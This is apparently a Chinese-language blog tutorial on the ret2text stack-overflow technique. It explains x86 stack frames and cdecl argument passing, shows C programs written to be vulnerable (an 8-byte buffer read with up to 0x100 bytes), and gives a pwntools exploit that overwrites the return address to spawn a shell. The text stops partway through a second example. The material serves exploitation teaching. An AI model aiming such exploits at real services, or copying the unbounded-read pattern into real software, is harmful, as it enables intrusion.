@@ -1,0 +1,447 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ret2_text | Shans</title><meta name="author" content="shans,812805524@qq.com"><meta name="copyright" content="shans"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2_text基础  当程序本身存在自带‘&#x2F;bin&#x2F;sh’的后门函数，且有明显栈溢出时可用ret2_text,例：  1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char sh[]&#x3D;&quot;&#x2F;bin&#x2F;sh&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2_text">
+<meta property="og:url" content="https://github.com/shan-shi/shan-shi.github.io/2023/02/02/ret2-text/index.html">
+<meta property="og:site_name" content="Shans">
+<meta property="og:description" content="ret2_text基础  当程序本身存在自带‘&#x2F;bin&#x2F;sh’的后门函数，且有明显栈溢出时可用ret2_text,例：  1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char sh[]&#x3D;&quot;&#x2F;bin&#x2F;sh&amp;quot">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC01216.JPG">
+<meta property="article:published_time" content="2023-02-02T06:50:39.000Z">
+<meta property="article:modified_time" content="2023-02-03T12:02:00.907Z">
+<meta property="article:author" content="shans">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC01216.JPG"><link rel="shortcut icon" href="https://img-cdn.ccrui.cn/2022/12/24/7351C2DA913DA66E4455998E217E8817.gif"><link rel="canonical" href="https://github.com/shan-shi/shan-shi.github.io/2023/02/02/ret2-text/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#e58a8a","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2_text',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-03 20:02:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img-cdn.ccrui.cn/2022/12/24/1579664069302.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC01216.JPG')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Shans</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2_text</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-02T06:50:39.000Z" title="发表于 2023-02-02 14:50:39">2023-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-03T12:02:00.907Z" title="更新于 2023-02-03 20:02:00">2023-02-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2_text"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/02/02/ret2-text/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/02/02/ret2-text/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ret2-text基础">ret2_text基础</h1>
+<blockquote>
+<p>当程序本身存在自带‘/bin/sh’的后门函数，且有明显栈溢出时可用ret2_text,例：</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(sh);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">	<span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="做题基本步骤：">做题基本步骤：</h2>
+<ol>
+<li>
+<p>运行程序观察程序大概是干什么的</p>
+<ol start="2">
+<li>checksec检查保护，和程序的基本信息（i386/x86_64等等）</li>
+<li>IDA Pro反编译程序，</li>
+<li>GDB 动态调试寻找漏洞</li>
+<li>根据IDA+GDB编写exploit</li>
+<li>在本地运行攻击程序，再远程攻击</li>
+</ol>
+</li>
+</ol>
+<h2 id="函数调用时寄存器的变化-esp-ebp">函数调用时寄存器的变化（esp，ebp）</h2>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202152005.png" alt=""></p>
+<p>将执行中程序理解为这四部分：</p>
+<ul>
+<li>
+<p>text部分：是自己写的代码，代码段</p>
+</li>
+<li>
+<p>heap： 堆区，（malloc申请的空间）</p>
+</li>
+<li>
+<p>外部函数：动态链接库之类的，不是程序本身就有的（动态链接类程序）</p>
+</li>
+<li>
+<p>stack：栈，ret2text主要依靠制造栈溢出来改变程序的执行流</p>
+</li>
+</ul>
+<h2 id="函数调用时基本示意图-x86">函数调用时基本示意图(x86)</h2>
+<h3 id="入栈">入栈</h3>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202163824.png" alt=""></p>
+<p>以上方为低地址:</p>
+<blockquote>
+<p>push eip : 先将esp减4,(esp向上移动)再将eip的值放入新的esp所指向的位置</p>
+<p>push ebp : 同上</p>
+<p>sub esp,0x20 : 为该函数开辟空间</p>
+</blockquote>
+<p>此时,在栈上,就成了这个模样</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202162202.png" alt=""></p>
+<p>此时,在此函数内,如果存在没有边界检查(或存在可以接收超过开辟的空间的大小的数据)的输入函数时,就有可能将eip的值覆盖掉,变成我们想要的函数的地址</p>
+<h3 id="出栈">出栈</h3>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/202302021621037.png" alt="202302021621037"></p>
+<p>以上方为低地址:</p>
+<blockquote>
+<p>leave:</p>
+<ul>
+<li>mov esp,ebp: 将ebp的值赋值给esp,esp就下降到和ebp相同的位置</li>
+<li>pop ebp: 因为ebp的值指向的是之前ebp的值,所以ebp返回原来的地址,esp加4,到0xffffaac8,指向入栈时eip所指向的值</li>
+</ul>
+<p>ret:</p>
+<ul>
+<li>pop eip: eip获得原来的值,esp再加4,回到入栈的起始位置</li>
+</ul>
+</blockquote>
+<p><font size='5'>由此我们就可以发现，这个出栈的过程中，函数出栈前的esp到ebp中存储的数据不会清除，出函数后可能仍会在栈中保存这个函数运行所产生的数据。</font></p>
+<p>但最后esp和ebp的关系总体还是这样:</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202162826.png" alt=""></p>
+<h2 id="例1">例1:</h2>
+<p>这就是上面的源代码,用gcc编译成32位程序(没有开地址随机化):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(sh);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">	<span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>再用ida反编译一下</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202170046.png" alt=""></p>
+<p>明显可以看到,dufunc中的read函数(gets,scanf的底层函数,就是接收用户输入)可以接收0x100个字符,但buf到ebp的距离只有0x10</p>
+<p>画个图理解一下这个函数的栈空间:</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202170700.png" alt=""></p>
+<p>当read函数接收用户写入的东西时,会写入buf的地址,并依次由低地址写向高地址,直到用户输入结束或者超过向read函数传入的第三个参数的大小(此题就是0x100),但此题中,buf到ebp的距离只有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>a</mi><mi>a</mi><mi>c</mi><mi>c</mi><mo>−</mo><mn>0</mn><mi>x</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>a</mi><mi>a</mi><mi>b</mi><mi>c</mi><mo>=</mo><mn>0</mn><mi>x</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">0xffffaacc-0xffffaabc=0x10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">ffff</span><span class="mord mathnormal">aa</span><span class="mord mathnormal">cc</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">ffff</span><span class="mord mathnormal">aab</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span></span></span></span>个字节(实际数值应由gdb动态调试得到)</p>
+<p>所以当我们输入的数据多余0x10个时,就可以改掉ebp中的值,但是此题中改掉ebp中的值对程序的执行过程没有一点作用.但是ebp下面的返回地址就可以改变程序的执行过程(ret 时会pop 这个地方的值给eip),如果我们在这个地方填上我们想要执行的函数的地址,就可以使eip直接去执行我们想要的地址.</p>
+<p>在IDA中看到存在调用system函数的的函数地址为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>08049182</mn></mrow><annotation encoding="application/x-tex">0x08049182</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">08049182</span></span></span></span></p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202172412.png" alt=""></p>
+<p>因为没有开地址随机化,于是可以直接编写exploit:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, ) 远程题用这一行做</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>    <span class="comment">#通过调试得到 </span></span><br><span class="line"><span class="comment">#0x10覆盖ebp再加0x4(32位)完全覆盖ebp到达返hui</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io) <span class="comment"># gdb附加调试</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p32(return_addr)  <span class="comment"># p32(),将return_addr转化成机器可识别的地址(因为程序是小端序,不能直接输入0x08049182)</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)  <span class="comment"># 在接收了delimiter再发送payload</span></span><br><span class="line">io.interactive() <span class="comment"># 启动交互,如果得到了shell,就可以正常使用,否则会返回EOF</span></span><br></pre></td></tr></table></figure>
+<h2 id="函数的传参-32位-cdecl">函数的传参（32位，__cdecl）</h2>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203161435.png" alt=""></p>
+<p>如图：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203162321.png" alt=""></p>
+<table><tr><td bgcolor=PowderBlue><label style="color:blue">__cdecal : C/C++默认方式，参数从右向左入栈，主调函数负责栈平衡。</label> </td></tr></table>
+<blockquote>
+<p>1.push 参数3 使参数3先入栈（esp-4指向下一位置）</p>
+<p>2.push 参数2</p>
+<p>3.push 参数1</p>
+<p>4.call func 后面就是上面说的调用函数了</p>
+</blockquote>
+<p>根据这个很容易就知道，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>&gt;</mo><mn>0</mn><mo separator="true">,</mo><mi>X</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">X&gt;0,X\in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>时：</p>
+<ul>
+<li>rbp+x 为外部函数传给当前函数的参数  （图中ebp下面的位置）</li>
+<li>rbp-x 为函数内部自己的参数	     （图中ebp上面的位置）</li>
+</ul>
+<p>但是，我们布栈不能这么布，下面一个程序会便于理解</p>
+<h2 id="例2：">例2：</h2>
+<p>程序代码如图，gcc 编译，不开地址随机化，编译成32位程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">	<span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个代码就可以看到，存在system（）函数，也存在“/bin/sh”字符串，但system函数没有参数，无法直接靠运行到func函数来取得shell，所以要对func（）函数传参或直接传参给system（）</p>
+<p>根据上面的传参规则：</p>
+<p>我们第一步可以想到这样布栈：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203174559.png" alt=""></p>
+<p>于是，我们将编译好的程序丢到IDA中静态看一看，可以发现在func函数中：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203170226.png" alt=""></p>
+<p>buf变量IDA算出（可能不准）到我们要的ebp只有0x10个字节的长度，而read（）函数对读入字符个数的限制为0x100，我们就可以构造栈溢出：</p>
